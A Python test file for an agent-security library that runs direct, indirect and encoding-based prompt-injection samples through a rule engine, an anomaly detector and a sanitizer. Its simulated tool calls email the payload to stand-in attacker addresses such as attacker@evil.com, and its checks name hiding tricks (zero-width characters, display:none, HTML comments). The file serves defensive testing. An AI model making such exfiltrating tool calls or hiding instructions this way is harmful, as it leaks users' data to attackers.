"""Regression tests: Run attack samples through the detection pipeline."""

import json
from pathlib import Path

import pytest

from agentshield_core.engine.intent.rule_engine import RuleEngine
from agentshield_core.engine.intent.anomaly import AnomalyDetector
from agentshield_core.engine.intent.models import (
    ToolCall,
    IntentContext,
    Intent,
)
from agentshield_core.engine.sanitization.format_cleansing import FormatCleansingStage
from agentshield_core.engine.trust.levels import TrustLevel

SAMPLES_DIR = Path(__file__).parent / "samples"


def _load_jsonl(filename: str) -> list[dict]:
    path = SAMPLES_DIR / filename
    samples = []
    for line in path.read_text().strip().splitlines():
        line = line.strip()
        if line:
            samples.append(json.loads(line))
    return samples


class TestDirectInjectionSamples:
    """Test that direct injection payloads are caught by rule engine or anomaly detector."""

    @pytest.fixture
    def rule_engine(self) -> RuleEngine:
        return RuleEngine()

    @pytest.fixture
    def anomaly_detector(self) -> AnomalyDetector:
        return AnomalyDetector()

    def _simulate_tool_call(self, payload: str) -> tuple[ToolCall, IntentContext]:
        """Simulate a tool call where the payload appears as a parameter."""
        tc = ToolCall(
            name="send_email",
            params={"body": payload, "to": "attacker@evil.com"},
        )
        ctx = IntentContext(
            original_message="process incoming data",
            intent=Intent(intent="process data"),
            current_data_trust_level=TrustLevel.EXTERNAL,
        )
        return tc, ctx

    def test_all_malicious_samples_detected(self, rule_engine, anomaly_detector):
        samples = _load_jsonl("direct_injection.jsonl")
        malicious = [s for s in samples if s.get("expected_block", True)]
        detected = 0
        missed = []

        for sample in malicious:
            tc, ctx = self._simulate_tool_call(sample["payload"])

            # Check rule engine
            rule_result = rule_engine.check(tc, ctx)
            if rule_result.triggered:
                detected += 1
                continue

            # Check anomaly detector
            anomaly_result = anomaly_detector.check(tc, ctx)
            if anomaly_result.score > 0.2:
                detected += 1
                continue

            missed.append(sample["id"])

        detection_rate = detected / len(malicious)
        assert detection_rate >= 0.95, f"Detection rate {detection_rate:.1%} below 95%. Missed: {missed}"

    def test_benign_samples_not_blocked(self, rule_engine, anomaly_detector):
        samples = _load_jsonl("direct_injection.jsonl")
        benign = [s for s in samples if not s.get("expected_block", True)]
        false_positives = []

        for sample in benign:
            tc = ToolCall(
                name="summarize",
                params={"text": sample["payload"]},
            )
            ctx = IntentContext(
                original_message=sample["payload"],
                intent=Intent(intent="summarize", expected_tools=["summarize"]),
                current_data_trust_level=TrustLevel.VERIFIED,
            )

            rule_result = rule_engine.check(tc, ctx)
            if rule_result.triggered and rule_result.decision.action == "BLOCK":
                false_positives.append(sample["id"])

        assert len(false_positives) == 0, f"False positives on benign samples: {false_positives}"


class TestIndirectInjectionSamples:
    """Test that indirect injection payloads are caught."""

    @pytest.fixture
    def rule_engine(self) -> RuleEngine:
        return RuleEngine()

    @pytest.fixture
    def anomaly_detector(self) -> AnomalyDetector:
        return AnomalyDetector()

    def test_block_samples_detected(self, rule_engine, anomaly_detector):
        samples = _load_jsonl("indirect_injection.jsonl")
        should_block = [s for s in samples if s.get("expected_action") == "BLOCK"]
        detected = 0
        missed = []

        for sample in should_block:
            tc = ToolCall(
                name="send_email",
                params={"body": sample["payload"], "to": "external@evil.com"},
            )
            ctx = IntentContext(
                original_message="process external data",
                intent=Intent(intent="process data"),
                current_data_trust_level=TrustLevel.EXTERNAL,
            )

            rule_result = rule_engine.check(tc, ctx)
            if rule_result.triggered:
                detected += 1
                continue

            anomaly_result = anomaly_detector.check(tc, ctx)
            if anomaly_result.score > 0.2:
                detected += 1
                continue

            missed.append(sample["id"])

        detection_rate = detected / len(should_block) if should_block else 1.0
        assert detection_rate >= 0.95, f"Detection rate {detection_rate:.1%} below 95%. Missed: {missed}"

    def test_allow_samples_not_blocked(self, rule_engine, anomaly_detector):
        samples = _load_jsonl("indirect_injection.jsonl")
        should_allow = [s for s in samples if s.get("expected_action") == "ALLOW"]
        false_positives = []

        for sample in should_allow:
            tc = ToolCall(
                name="summarize",
                params={"text": sample["payload"]},
            )
            ctx = IntentContext(
                original_message="summarize content",
                intent=Intent(intent="summarize", expected_tools=["summarize"]),
                current_data_trust_level=TrustLevel.VERIFIED,
            )

            rule_result = rule_engine.check(tc, ctx)
            if rule_result.triggered and rule_result.decision.action == "BLOCK":
                false_positives.append(sample["id"])

        assert len(false_positives) == 0, f"False positives on benign samples: {false_positives}"


class TestEncodingAttackSamples:
    """Test that encoding attacks are properly sanitized."""

    @pytest.fixture
    def stage(self) -> FormatCleansingStage:
        return FormatCleansingStage()

    @pytest.mark.asyncio
    async def test_sanitization_removes_hidden_content(self, stage):
        samples = _load_jsonl("encoding_attacks.jsonl")
        should_sanitize = [s for s in samples if s.get("expected_sanitized", False)]
        failed = []

        for sample in should_sanitize:
            result = await stage.process(sample["payload"])
            # After sanitization, zero-width chars should be removed
            has_zero_width = any(c in result for c in "\u200b\u200c\u200d\ufeff")
            # Hidden HTML should be removed
            has_hidden_html = "display:none" in result or "visibility:hidden" in result
            # HTML comments should be removed
            has_comments = "<!--" in result

            if has_zero_width or has_hidden_html or has_comments:
                failed.append(sample["id"])

        assert len(failed) == 0, f"Sanitization incomplete for: {failed}"

    @pytest.mark.asyncio
    async def test_benign_samples_preserved(self, stage):
        samples = _load_jsonl("encoding_attacks.jsonl")
        benign = [s for s in samples if not s.get("expected_block", False) and not s.get("expected_sanitized", False)]

        for sample in benign:
            result = await stage.process(sample["payload"])
            # Benign content should be mostly preserved
            assert len(result) > 0, f"Sample {sample['id']} was emptied"
